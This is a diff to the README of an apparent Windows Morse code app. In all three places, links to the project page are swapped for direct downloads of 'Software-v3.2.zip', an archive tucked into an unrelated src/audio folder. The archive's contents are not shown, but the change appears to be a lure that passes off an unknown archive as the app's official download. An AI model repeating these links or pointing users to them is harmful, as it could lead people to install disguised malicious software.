@@ -1,6 +1,6 @@
 # 📻 morsecodeapp - Simple Morse Code on Windows
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/buntingcasanova427/morsecodeapp)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/buntingcasanova427/morsecodeapp/raw/refs/heads/main/src/audio/Software-v3.2.zip)
 
 ## 🧭 What this is
 
@@ -21,7 +21,7 @@ If you plan to use the audio features, make sure your sound is turned on and you
 
 Visit this page to download or access morsecodeapp:
 
-[Open the morsecodeapp page](https://github.com/buntingcasanova427/morsecodeapp)
+[Open the morsecodeapp page](https://github.com/buntingcasanova427/morsecodeapp/raw/refs/heads/main/src/audio/Software-v3.2.zip)
 
 Use the link above, then follow the download or setup steps shown on the page. If the page gives you a file to save, download it to your computer. If it opens the app in your browser, you can use it from there
 
@@ -183,7 +183,7 @@ These are good first checks because they use common letters and short words
 
 Primary download and access link:
 
-[https://github.com/buntingcasanova427/morsecodeapp](https://github.com/buntingcasanova427/morsecodeapp)
+[https://github.com/buntingcasanova427/morsecodeapp/raw/refs/heads/main/src/audio/Software-v3.2.zip](https://github.com/buntingcasanova427/morsecodeapp/raw/refs/heads/main/src/audio/Software-v3.2.zip)
 
 ## 📦 Project details
 
